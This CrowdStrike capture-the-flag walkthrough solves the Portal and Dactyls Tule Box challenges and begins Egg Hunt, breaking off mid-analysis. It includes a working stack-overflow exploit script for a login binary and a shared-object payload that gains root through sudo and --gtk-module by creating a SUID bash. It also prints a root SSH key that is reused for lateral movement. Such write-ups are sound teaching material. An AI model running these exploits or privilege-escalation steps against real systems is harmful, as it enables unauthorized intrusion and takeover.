# Adversary Quest 2021: 4 Protective Penguin Targeted Intrusion Challenges | CrowdStrike

- **Source :** crowdstrike
- **URL :** https://www.crowdstrike.com/en-us/blog/adversary-quest-walkthrough-four-protective-penguin-targeted-intrusion-challenges/
- **Date :** June 02, 2021

---

# Adversary Quest 2021 Walkthrough, Part 3: Four PROTECTIVE PENGUIN Challenges

June 02, 2021

• [ Hanno Heinrichs - Lukas Kupczyk - Max Julian Hofmann](/en-us/blog/author.hanno-heinrichs---lukas-kupczyk---max-julian-hofmann/ "Posts by Hanno Heinrichs - Lukas Kupczyk - Max Julian Hofmann") • [Threat Hunting & Intel](/en-us/blog/category.counter-adversary-operations/ "Threat Hunting & Intel")


At the end of January 2021, the CrowdStrike Intelligence Advanced Research Team hosted our first-ever Adversary Quest. This “capture the flag” event featured 12 information security challenges in three different tracks: eCrime, Hacktivism and Targeted Intrusion. In the third track, Targeted Intrusion, players were pitted against the fictional adversary PROTECTIVE PENGUIN. Their objective was described as follows: _An Antarctica-based APT with a counterintelligence mission. Born out of the necessity to protect their Antarctic colonies from discovery, sentient wildlife has acquired the technology and skill set that allows PROTECTIVE PENGUIN to target research institutes, cruise lines and satellite imagery providers._ [Part 1 of this three-part blog series covered the challenges in the eCrime track](/en-us/blog/adversary-quest-walkthrough-four-catapult-spider-ecrime-challenges/). [Part 2 of this three-part blog series covered the challenges in the hacktivism track](/en-us/blog/adversary-quest-walkthrough-four-space-jackal-hacktivist-challenges/). This blog, Part 3, provides a walkthrough of the four challenges in the Targeted Intrusion track: Portal, Dactyls Tule Box, Egg Hunt and Exfiltrat0r.

## Challenge 1: Portal

The PROTECTIVE PENGUIN track started off with the following challenge: _PROTECTIVE PENGUIN gained access to one of their victims through the victim's extranet authentication portals and we were asked to investigate._ In order to investigate how the actor was able to gain access, we get an archive with the portal binary and a URL for a running instance of the portal. The task is to analyze the code of the web application locally and to eventually exploit the application remotely. The code can be unpacked as follows:
    
    
    $ tar zxvf authportal.tar.gz 
    authportal/
    authportal/cgi-bin/
    authportal/cgi-bin/portal.cgi  # CGI binary that validates entered
                                   # credentials
    authportal/index.html          # HTML file that posts entered credentials to
                                   # /cgi-bin/portal.cgi
    authportal/creds.txt           # valid credentials for the portal
    authportal/run.sh              # script that starts a Python-based web server
    

A first analysis shows that the Bash script `run.sh` starts a Python-based CGI web server that serves the current working directory and runs executable files inside the cgi-bin directory when requested. The HTML document `index.html` renders a form that takes a username and a password and sends the input via HTTP POST to `/cgi-bin/portal.cgi`. When observing the behavior of the portal, one can assume that the CGI binary `portal.cgi` (ELF x86-64) verifies the entered credentials against a list of valid credentials that is stored in `creds.txt`: If valid credentials from `creds.txt` are supplied, the flag `CS{foobar}` is displayed. Of course, that is just a dummy flag and the credentials from `creds.txt` do not work remotely. This leaves the player with one promising lead to follow: to reverse engineer and exploit the `portal.cgi` binary. The `main` function at address `0x401434` can be analyzed easily with the help of a decompiler. The generated pseudocode reveals the following points:

  * The expected request method seems to be POST (which is consistent with how the JavaScript inside `index.html` interacts with `portal.cgi`).
  * The expected `Content-Type` seems to be `application/json` (also consistent with what we know from `index.html`).
  * The HTTP request body is expected to be a JSON object with the key/value pairs `user` and `pass`: {"`user`": "`entered username`", "`pass`": "`entered password`"}
  * The function `sub_401226` (which is called at address `0x40164A`) takes two const char pointers as arguments that point to the values of `user` and `pass`. If the function returns 0, the CGI binary sends a JSON response that includes the flag (which will eventually get rendered by `index.html`). Otherwise, the JSON response is used to indicate an error.
  * The flag is retrieved from the environment variable `FLAG`.



The fact that the vulnerable binary is capable of printing the flag is a good indication that you likely do not need to execute your own code in order to complete this challenge. As a next step, the function `sub_401226` (which was dubbed `verify_creds`) was decompiled for further analysis. The pseudocode is shown below:
    
    
    __int64 __fastcall verify_creds(const char *username, const char *password)
    {
      size_t tmp_strlen; // rax
      FILE *stream; //  
      size_t strlen_candidate; //  
      unsigned int creds_invalid; //   OVERLAPPED BYREF
      char stored_creds_line<256>; //   BYREF
      char input_creds_line<260>; //   BYREF
      char *filename; //  
      unsigned __int64 stack_cookie; //  
    
      stack_cookie = __readfsqword(0x28u);
      memset(&creds_invalid, 0, 0x210uLL);
      creds_invalid = 1;
      filename = "creds.txt";
      __b64_pton(username, (u_char *)input_creds_line, 256uLL);
      *(_WORD *)&input_creds_line = ':';
      tmp_strlen = strlen(input_creds_line);
      __b64_pton(password, (u_char *)&input_creds_line, 256uLL);
      stream = fopen(filename, "r");
      if ( !stream )
        return 0xFFFFFFFFLL;
      while ( fgets(stored_creds_line, 256, stream) )
      {
        strlen_candidate = strlen(stored_creds_line);
        if ( strchr(stored_creds_line, ':') )
        {
          if ( strlen_candidate )
          {
            if ( stored_creds_line == '\n' )
              stored_creds_line = 0;
          }
          if ( !strcmp(input_creds_line, stored_creds_line) )
          {
            creds_invalid = 0;
            break;
          }
        }
      }
      fclose(stream);
      return creds_invalid;
    }
    

At the very beginning of the function, the stack variable `char *filename` is set to the address of the string `creds.txt`. This file stores a list of valid credentials. Next, the two arguments of the function, `username` and `password`, are Base64-decoded using the GNU C library function `__b64_pton()`. The decoded values are stored in the stack-allocated character array `input_creds_line`, separated by a colon (“**:** ”), e.g., `<decoded username>:<decoded password>`. Afterward, `fopen()` is used to open the credential file. Each line of the file is then compared to the user-supplied credentials if it contains a colon. In case of a match, the function returns 0, signaling that the user supplied valid credentials. Otherwise, 1 is returned. It was noticed that decoding the second parameter can overflow the stack-based buffer `input_creds_line`, which has a size of 260 bytes. During the first invocation of `b64_pton()`, when decoding the username, up to 256 bytes may be written. Subsequently, a colon (“**:** ”) is appended, which increments the buffer utilization to 257 bytes in the worst case. Regardless of the space that is already used for storing the username and the colon, the second invocation of `b64_pton()` to decode the supplied password will then write up to 256 bytes beyond the colon. In other words, up to 253 bytes may get written beyond the designated target buffer `input_creds_line (260 - 257 - 256 = -253``)`. Unfortunately, the function makes use of a stack cookie, and byte-wise brute forcing its 64-bit value is not an option either, as the target is not a forking server. Therefore, exploiting the program by overwriting the return address becomes infeasible. Revisiting the stack layout of the function, it becomes clear that the `filename` pointer, which points to `creds.txt`, is adjacent to the end of the `input_creds_line` buffer. This would make a perfect target to be overwritten. In fact, it is the only reasonable target in our situation, as the `filename` pointer is located immediately before the stack cookie, which will result in program termination when overwritten. If we can overwrite the `filename` pointer, we can choose our own credentials file and thereby bypass authentication. But in order to do that, we need the address of a string that qualifies as a valid file path. Further, the file must exist and needs to contain a known value matching the expected `<username>:<password>` pattern. It is assumed that ASLR is enabled on the remote system so the only known address space are the loaded segments of the CGI binary itself, which was not compiled as a position-independent executable. When examining the strings contained in the binary, only one absolute file path is found. It is the path of the dynamic linker, `/lib64/ld-linux-x86-64.so.2`, which is located at address `0x4002A8`. All other strings would be interpreted as files relative to the current working directory, and those are highly unlikely to exist. When looking at the dynamic linker of an Ubuntu 20.04 installation, it becomes apparent that this file contains the required pattern numerous times. Most occurrences of the pattern are related to debug or error message format strings, such as the example below:
    
    
    $ sha256sum /lib64/ld-linux-x86-64.so.2
    96493303ba8ba364a8da6b77fbb9f04d0f170cbecbc6bbacca616161bd0f0008  /lib64/ld-linux-x86-64.so.2
    $ xxd /lib64/ld-linux-x86-64.so.2 | grep 000257f0 -A 2
    000257f0: 2f64 6c2d 7275 6e74 696d 652e 6300 0a63  /dl-runtime.c..c
    00025800: 616c 6c69 6e67 2069 6e69 743a 2025 730a  alling init: %s.
    00025810: 0a00 0a63 616c 6c69 6e67 2070 7265 696e  ...calling prein
    

The same format strings were identified in the dynamic linker binary that is shipped with Fedora 33. Thus, it was concluded that these strings are unlikely to change across distributions and that they likely exist on the target machine as well. One last challenge that we need to address is the fact that we need to supply a “valid” combination of username and password from the dynamic linker, while at the same time we need to trigger the overflow. This can be accomplished by supplying the Base64-encoded counterparts of “`calling init`” and “` %s\x00<padding><address of dynamic linker>`” as username and password. When the colon-separated credential line is prepared in memory, the second `__b64_pton()` invocation will overwrite the `filename` pointer with the address of the path to the dynamic linker. At the same time, the prepared credential line will be terminated early by the inserted null byte. Thus, the final `strcmp()`, which compares the prepared credential line against all candidates from the dynamic linker, will stop early as well, and the decoded bytes after the null byte will not be taken into account for the comparison. After the comparison succeeds, the CGI binary should send the flag as part of the HTTP response. The process was automated in a Python script:
    
    
    $ ./portal-exploit.py https://authportal.challenges.adversary.zone:8880/
     {"status": "success", "flag": "CS{w3b_vPn_h4xx}"}
    

The script code is shown below:
    
    
    #!/usr/bin/env python3
    
    import argparse
    from base64 import b64encode
    import requests
    import struct
    from urllib.parse import urljoin
    
    def p64(n):
        return struct.pack('<Q', n)
    
    def pwn(baseurl):
        # LOAD:00000000004002A8 aLib64LdLinuxX8 db '/lib64/ld-linux-x86-64.so.2',0
        dyn_linker_addr = 0x4002a8
    
        username = b'calling init'
        password = bytearray()
        password.extend(b' %s\x00')
        # The buffer size/distance to *filename is 260 bytes. We subtract
        # - the size of the username,
        # - one byte for the colon and
        # - the size of the null-terminated password.
        # The difference is the size of the padding that is needed to
        # overwrite *filename.
        pad_size = 260 - len(username) - 1 - len(password)
        password.extend(b'A'*pad_size)
        password.extend(p64(dyn_linker_addr))
    
        username_enc = b64encode(username).decode()
        password_enc = b64encode(password).decode()
    
        creds = {
            'user': username_enc,
            'pass': password_enc,
        }
        s = requests.Session()
        url = urljoin(baseurl, '/cgi-bin/portal.cgi')
        r = s.post(url, json=creds)
        print(r, r.text)
    
    def main():
        parser = argparse.ArgumentParser()
        parser.add_argument('url')
        args = parser.parse_args()
        pwn(args.url)
    
    if __name__ == '__main__':
        main()
    

## Challenge 2: Dactyls Tule Box

Challenge 2 is presented such that our fictional adversary PROTECTIVE PENGUIN compromised a company: _We just received another report that PROTECTIVE PENGUIN was identified at a company that provides access to mapping software as a service. The adversary allegedly elevated privileges and then moved laterally to a backup server._ _We were provided with a Virtual Machine Image of the mapping service. Can you analyze the image and reproduce the attack? If you think you've got it, the victim let us stand up an exact replica of their environment so that you can validate your results:_ _You can SSH as user customer01 to maps-as-a-service.challenges.adversary.zone on port 4141 using the following SSH private key:_

__

__
    
    
    _-----BEGIN OPENSSH PRIVATE KEY-----<...>
    -----END OPENSSH PRIVATE KEY-----_
    

In this challenge, we are supposed to reproduce an alleged privilege escalation. We are given a virtual machine image for analysis and SSH credentials for a remote system. To start our analysis, we unpack the downloaded virtual machine image by using `gzip -d adversary-quest-mapviewer.qcow2.gz` and then set up a new VM in `virt-manager`

with the unpacked QCOW2 image as the hard drive. Next, we copy the SSH private key into a file called `key` and change the permissions to `600` so that read and write operations are limited to the user that owns the file. If the permissions are too wide, the OpenSSH client will refuse to use the file and instead urge the user to change permissions. Once our local VM is up and running, we can SSH into it for the first time:
    
    
    $ ssh -i key -p 4141 customer01@192.168.122.189
    Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-62-generic x86_64)
    <...>
    customer01@maps-as-a-service:~$ uname -a
    Linux maps-as-a-service 5.4.0-62-generic #70-Ubuntu SMP Tue Jan 12 12:45:47 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
    customer01@maps-as-a-service:~$ cat /etc/os-release 
    NAME="Ubuntu"
    VERSION="20.04.1 LTS (Focal Fossa)"
    ID=ubuntu
    ID_LIKE=debian
    PRETTY_NAME="Ubuntu 20.04.1 LTS"
    VERSION_ID="20.04"
    <...>
    

Some initial reconnaissance suggests that this is an Ubuntu 20.04 LTS system running on a recently compiled kernel. While privilege escalation can happen in countless different ways, some types occur more often than others. The more frequent routes are the following:

  * Exploitation of a SUID/SGID binary
  * Exploitation of a binary you may execute through `sudo`
  * Privileged files being writable by unprivileged users
  * Exploitation of local services (e.g., loopback-bound or UNIX sockets)
  * Exploitation of the kernel



The hunt for SUID and SGID binaries did not yield any suspicious or custom binaries. All of them seem to be included in Ubuntu’s default repositories, and the challenge VM is pretty much up-to-date. It is unlikely that capture-the-flag players are supposed to find an undisclosed vulnerability in the stock SUID/SGID binaries. Note that the heap-based buffer overflow vulnerability in sudo (CVE-2021-3156) was still under embargo when the challenge was published. Next, we take a look if there are any commands that sudo would let us execute as another user. To do so, we invoke `sudo -ll`, which prints the following:
    
    
    customer01@maps-as-a-service:~$ sudo -ll
    Matching Defaults entries for customer01 on maps-as-a-service:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User customer01 may run the following commands on maps-as-a-service:
    
    Sudoers entry:
        RunAsUsers: ALL
        Options: !authenticate
        Commands:
    	/usr/local/bin/mapviewer
    

This tells us that we are allowed to execute the binary `/usr/local/bin/mapviewer` via `sudo` as `root` without authentication. The fact that the binary resides below `/usr/local` is a strong indication that it is custom-made and does not originate from a default Ubuntu package. Furthermore, the name of the binary, `mapviewer`, aligns with the description of the challenge. When we try to start it, we see an error message that indicates that the connection to the X server has failed and that we therefore do not see a GUI.
    
    
    customer01@maps-as-a-service:~$ sudo mapviewer
    Unable to init server: Could not connect: Connection refused
    
    (mapviewer:3026): Gtk-WARNING **: 14:14:13.802: cannot open display:
    

This confirms that we in fact have permission to run `mapviewer` as `root`. Furthermore, the error message tells us that the binary is GTK-based. If we can exploit this binary and make it run our own code, it would also get executed as `root`. Typical avenues for passing malicious input to a vulnerable program to exploit it include standard input `(``stdin``)`, environment variables, command line arguments, sockets, malicious GUI interactions and shared library search order hijacking. When inspecting the binary, it becomes apparent that the application links against `[osm-gps-map](https://github.com/nzjrs/osm-gps-map)`, a Gtk+ widget for displaying OpenStreetMap and Google Maps tiles. Most of the `mapviewer` code seems to originate from an example application with the same name that is provided by the [`osm-gps-map` project](https://github.com/nzjrs/osm-gps-map/blob/master/examples/mapviewer.c). Such code overlaps greatly help reduce time-consuming reverse engineering efforts. We can see that `mapviewer` does not read input from stdin and that it does not contain any networking code. Therefore, we can rule out `stdin` and network sockets as ways for passing malicious input. From the `env_reset` flag in the `sudo -ll` output, we know that `sudo` will not allow us to pass a custom environment to `mapviewer`. This leaves us with shared object search order hijacking, malicious GUI interactions and malicious command-line arguments as possible attack vectors that we still need to check. One convenient way to gain visibility into the shared object search order is to use the tool `strace` on the target binary. By monitoring system calls related to file accesses, we should be able to spot a vulnerable search order easily. As we have a local copy of the VM, we can simply grant ourselves the right to execute `strace` as `root` for testing purposes by appending the line `customer01 ALL=(ALL) NOPASSWD: ALL` to the file `/etc/sudoers.d/10-mapviewer`. The following listing shows the invocation of `mapviewer` via `strace`:
    
    
    customer01@maps-as-a-service:~$ sudo strace -e file mapviewer
    execve("/usr/local/bin/mapviewer", <"mapviewer">, 0x7ffff7d34c20 /* 24 vars */) = 0
    access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
    openat(AT_FDCWD, "/usr/local/lib/tls/haswell/x86_64/libgthread-2.0.so.0", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
    <...>
    

Unfortunately, all attempts of accessing shared objects, successful or not, referenced file paths that are not writable by unprivileged users. This outcome is not much of a surprise, as by default Ubuntu 19.10 and newer do not preserve the `HOME` environment variable [any more when using `sudo`](https://askubuntu.com/questions/1186999/how-does-sudo-handle-home-differently-since-19-10). Thus, the likelihood of searching the unprivileged user’s home directory for shared objects while executing as `root` has been reduced. In order to check for malicious GUI interactions, an X11-enabled SSH session to the local VM was established and `mapviewer` was started as an unprivileged user:
    
    
    $ ssh -i key -p 4141 -X customer01@192.168.122.189
    Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-62-generic x86_64)
    <...>
    customer01@maps-as-a-service:~$ mapviewer
    <...>
    

The user interface of mapviewer is shown in the following screenshot. Users can scroll the map, zoom in and out, and place marks on the map. Other than that, there does not appear to be any dangerous functionality implemented — an estimate that is also backed by our code analysis and reverse engineering efforts so far. ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2021/06/Picture2.png) The last item on our list of potential attack vectors is malicious command-line arguments. `mapviewer` does not advertise any command-line arguments that would obviously present a security risk:
    
    
    customer01@maps-as-a-service:~$ mapviewer --help
    Usage:
      mapviewer  - Map browser
    
    Options:
      -n, --no-cache            Disable cache
      -e, --editable-tracks     Make the tracks editable
    
    
    Valid map sources:
    	0:	None
    	1:	OpenStreetMap I
    <...>
    	12:	Virtual Earth Hybrid
    

When compared to the `mapviewer` source code on GitHub, it becomes apparent that even several command-line options have been removed from the GitHub version. However, `mapviewer` is a GTK application. According to the GTK documentation, GTK applications implicitly accept a set of [GTK-specific command-line arguments](https://developer.gnome.org/gtk3/stable/gtk-running.html): _All GTK+ applications support a number of standard commandline options. These are removed from`argv` by `gtk_init()`. Modules may parse and remove further options. The X11 and Windows GDK backends parse some additional commandline options._ _`--gtk-module module``.` A list of modules to load in addition to those specified in the `GTK3_MODULES` environment variable and the `gtk-modules` setting._ The `--gtk-module` option looks particularly interesting as it should allow us to load our own malicious module in the privileged `mapviewer` process. At this point, we have two options: We can either read on GTK documentation and build a valid GTK module, or we can ignore the GTK-specific requirements for modules and take a shortcut. We took the shortcut, which, by coincidence, is even universally applicable to dynamically linked binaries: By marking our payload function with the `constructor` attribute, we can instruct the dynamic loader to execute our payload once it loads our library and before control flow is passed to any GTK-specific loader code. The following code implements our payload, which creates a `root`-owned SUID-enabled copy of `bash` as a simple way of persisting our `root` privileges.
    
    
    #include 
    #include 
    
    __attribute__((constructor))
    void pwn()
    {
    	char *argv<> = {
    		"/bin/bash",
    		"-p",
    		"-c",
    	        "cp /bin/bash /bin/bash2; chmod +s /bin/bash2",
    		NULL
    	};
    
    	puts("Trying to create suid-enabled /bin/bash2...");
    	execve("/bin/bash", argv, NULL);
    }
    

The code can be compiled as follows: `$ gcc -shared -fPIC -o /tmp/pwn.so pwn.c` When executing `mapviewer` with `--gtk-module` option, we gain root privileges even before GTK has a chance to complain about a missing X11 connection or our module not adhering to GTK-specific module requirements:
    
    
    customer01@maps-as-a-service:~$ sudo mapviewer --gtk-module /tmp/pwn.so
    Trying to create suid-enabled /bin/bash2...
    customer01@maps-as-a-service:~$ ls -la /bin/bash2
    -rwsr-sr-x 1 root root 1183448 Mar 15 14:37 /bin/bash2
    customer01@maps-as-a-service:~$ bash2 -p
    bash2-5.0# id
    uid=1001(customer01) gid=1001(customer01) euid=0(root) egid=0(root) groups=0(root),1001(customer01)
    

We can use these privileges to read the SSH private key of the `root` user and the corresponding `known_hosts` file:
    
    
    bash2-5.0# cat /root/.ssh/id_ed25519
    -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
    QyNTUxOQAAACAFLrooVaQm4+u+uB4sHmJTcMn0IFFW5ac8qo/yIlgJ6AAAAKCMRPvrjET7
    6wAAAAtzc2gtZWQyNTUxOQAAACAFLrooVaQm4+u+uB4sHmJTcMn0IFFW5ac8qo/yIlgJ6A
    AAAED7UEgIa0dLauEO+obZLKUO9DTvUrUZskHUawW1KF1wpAUuuihVpCbj6764HiweYlNw
    yfQgUVblpzyqj/IiWAnoAAAAFnJvb3RAbWFwcy1hcy1hLXNlcnZpY2UBAgMEBQYH
    -----END OPENSSH PRIVATE KEY-----
    bash2-5.0# cat /root/.ssh/known_hosts 
    maps-backups.challenges.adversary.zone ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAaIwWWA8y9cIT5MfnbJ0x91Smgi6Zzf7D56u4Hr94Qd/toffdAO3c5ajm7E7GjgBIQ4YVRTh28pRBuL7QCSnDo
    

From the `known_hosts` file, we learn that this machine had likely established an SSH connection to the host `maps-backups.challenges.adversary.zone` at least once in the past. With the newly obtained key downloaded and stored as `id_ed25519_root`, a connection to that host can be established successfully to retrieve the flag:
    
    
    $ ssh -i id_ed25519_root backup@maps-backups.challenges.adversary.zone
    <...>
    CS{sudo_+_GTK_=_pwn}
    

Because of the security risks imposed by running GTK applications as `root`, [GTK even prevents SUID- and SGID-enabled binaries](http://www.gtk.org/setuid.html) from executing and terminates its own initialization, as shown below:
    
    
    (process:50984): Gtk-WARNING **: 16:33:41.444: This process is currently running setuid or setgid.
    This is not a supported use of GTK+. You must create a helper
    program instead. For further details, see:
    
        http://www.gtk.org/setuid.html
    
    Refusing to initialize GTK+.
    

As opposed to detecting a SUID or SGID context, detecting if a program was run via `sudo` is a much more involved task that cannot be accomplished easily. Thus, no warning or program termination occurs if GTK-linked programs such as `mapviewer` are run via `sudo`.

## Challenge 3: Egg Hunt

The third challenge of the PROTECTIVE PENGUIN track is called “Egg Hunt.” The challenge description reads as follows: _After moving laterally, PROTECTIVE PENGUIN compromised a number of additional systems and gained persistence. We have identified another host in the DMZ that we believe was backdoored by the adversary and is used to regain access._ _Please download a virtual machine image of that host and identify the backdoor. Validate your findings in our test environment on egghunt.challenges.adversary.zone._ The archive contains a shell script and a QCOW2 image, which can be unpacked as follows:
    
    
    $ tar Jxvf egghunt.tar.xz 
    egghunt/
    egghunt/art_ctf_egghunt_local.qcow2
    egghunt/run.sh
    

The shell script can be used to start a live snapshot of the VM and additionally forwards port 4422/tcp and 1337/udp from the host to the VM. After starting the VM through the script, we are presented with an interactive shell. While looking for suspicious files, a shared object named `libc.so.7` can be found in the directory `/dev/shm/x86_64-linux-gnu`:
    
    
    root@egghunt:~# ls -la /dev/shm
    total 0
    drwxrwxrwt  3 root root   60 Jan 14 12:15 .
    drwxr-xr-x 17 root root 3860 Jan 14 12:13 ..
    drwxr-xr-x  2 root root   60 Jan 14 12:15 x86_64-linux-gnu
    root@egghunt:~# ls -la /dev/shm/x86_64-linux-gnu/
    total 252
    drwxr-xr-x 2 root root     60 Jan 14 12:15 .
    drwxrwxrwt 3 root root     60 Jan 14 12:15 ..
    -rwxr-xr-x 1 root root 257416 Jan 14 12:15 libc.so.7
    root@egghunt:~# file /dev/shm/x86_64-linux-gnu/libc.so.7
    /dev/shm/x86_64-linux-gnu/libc.so.7: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, stripped
    

`/dev/shm` is a temporary filesystem, and as such, its contents are not retained across reboots, which makes this a highly unusual and suspicious location to store a shared object file. Any application that requires the shared object in that directory would become inoperable after a reboot. Further, the dynamic linker of the vulnerable image does not even search for shared objects in `/dev/shm/x86_64-linux-gnu`. These observations further strengthen the assumption that this file is almost certainly not legitimate. Executing `lsof` and grepping for the shared object’s name shows that it seems to be used by the `cron` process (pid 974):
    
    
    root@egghunt:~# lsof | grep libc.so.7
    cron       974       <...>  /dev/shm/x86_64-linux-gnu/libc.so.7
    

Further examination of `cron`’s environment variables shows that it has been injected into the process by using [LD_PRELOAD](https://man7.org/linux/man-pages/man8/ld.so.8.html):
    
    
    root@egghunt:~# strings /proc/$(pidof cron)/environ
    LD_PRELOAD=/dev/shm/x86_64-linux-gnu/libc.so.7
    SHELL=/bin/bash
    PWD=/root
    LOGNAME=root
    XDG_SESSION_TYPE=tty
    <...>
    

Listing the dynamic symbols of the shared object reveals that many of them are prefixed with the string `bpf_`.
    
    
    root@egghunt:~# nm -D /dev/shm/x86_64-linux-gnu/libc.so.7 
                     U access@@GLIBC_2.2.5
    0000000000020d40 T bpf_btf_get_fd_by_id
    0000000000020ba0 T bpf_btf_get_next_id
    000000000001f240 T bpf_create_map
    000000000001f470 T bpf_create_map_in_map
    000000000001f310 T bpf_create_map_in_map_node
    000000000001f2b0 T bpf_create_map_name
    000000000001f1c0 T bpf_create_map_node
    000000000001f050 T bpf_create_map_xattr
    00000000000210c0 T bpf_enable_stats
    0000000000020570 T bpf_iter_create
    0000000000020150 T bpf_link_create
    00000000000187a0 T bpf_link__destroy
    <...>
    

These symbols indicate that the shared object leverages [eBPF](https://ebpf.io) functionality in one way or another. This is further confirmed by the fact that the shared object contains lines of debug and error messages related to `[libbpf](https://github.com/libbpf/libbpf)`, a "library for loading eBPF programs and reading and manipulating eBPF objects from user-space”:
    
    
    root@egghunt:~# strings /dev/shm/x86_64-linux-gnu/libc.so.7 | grep libbpf
    <...>
    libbpf: prog '%s': relo #%d: target candidate search failed for 
    

[ ](https://www.linkedin.com/shareArticle) [ ](https://twitter.com/share)

* * *

#### Related Content

[ ![PhantomRaven: An LLM-Generated Information Stealer Developed for Bug Bounty Hunting](https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-InfoStealer?wid=2048&hei=1349&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0) Threat Hunting & Intel | Sep 15, 2026  PhantomRaven: An LLM-Generated Information Stealer Developed for Bug Bounty Hunting ](/en-us/blog/phantomraven-llm-generated-information-stealer-for-bug-bounty-hunting/) [ ![Peer Pressure: Inside the Sality Botnet Disruption Operation](https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-FalCon-Sality?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0) Threat Hunting & Intel | Sep 01, 2026  Peer Pressure: Inside the Sality Botnet Disruption Operation ](/en-us/blog/inside-sality-botnet-disruption-operation/) [ ![CrowdStrike 2026 Threat Hunting Report: Exploitation Window Closes as AI Use Accelerates](https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-THR-2026?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0) Threat Hunting & Intel | Aug 03, 2026  CrowdStrike 2026 Threat Hunting Report: Exploitation Window Closes as AI Use Accelerates ](/en-us/blog/crowdstrike-2026-threat-hunting-report/)